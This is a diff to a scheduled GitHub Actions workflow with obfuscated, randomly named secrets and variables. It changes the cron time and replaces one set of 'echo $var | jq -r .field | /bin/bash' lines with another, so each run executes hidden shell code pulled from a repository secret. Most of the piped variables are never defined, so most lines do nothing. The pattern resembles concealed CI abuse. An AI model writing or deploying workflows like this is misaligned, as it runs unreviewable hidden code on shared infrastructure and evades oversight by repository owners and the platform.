@@ -3,24 +3,23 @@ name: gzhengfudy
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 5/6 * * *'
-jobs:  # 15208
+    - cron: '57 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: gzhengfudy
         env:
-          sfhwl5123: ${{ secrets.sfhwl5123 }}
+          my796: ${{ secrets.my796 }}
         run: |
-          echo $sfhwl5123 | jq -r .qwkul2283 | /bin/bash
-          echo $d4 | jq -r .yhglm752 | /bin/bash
-          echo $cj0648 | jq -r .p6 | /bin/bash
-          echo $qep36 | jq -r .aa3717 | /bin/bash
-          echo $h217 | jq -r .yebyb621 | /bin/bash
-          echo $y33121 | jq -r .ahrg20286 | /bin/bash
-          echo $jm0293 | jq -r .el76 | /bin/bash
-          echo $rdpru908 | jq -r .ssass51 | /bin/bash
-          echo $x3830 | jq -r .s2 | /bin/bash
+          echo $my796 | jq -r .a43 | /bin/bash
+          echo $ngmmm1 | jq -r .h21191 | /bin/bash
+          echo $b97 | jq -r .rut725 | /bin/bash
+          echo $gnaei5 | jq -r .snsac45481 | /bin/bash
+          echo $zz72 | jq -r .d2113 | /bin/bash
+          echo $gw271 | jq -r .ew018 | /bin/bash
+          echo $p76 | jq -r .duvbk1 | /bin/bash
+          echo $lfsy3 | jq -r .sx4 | /bin/bash
 
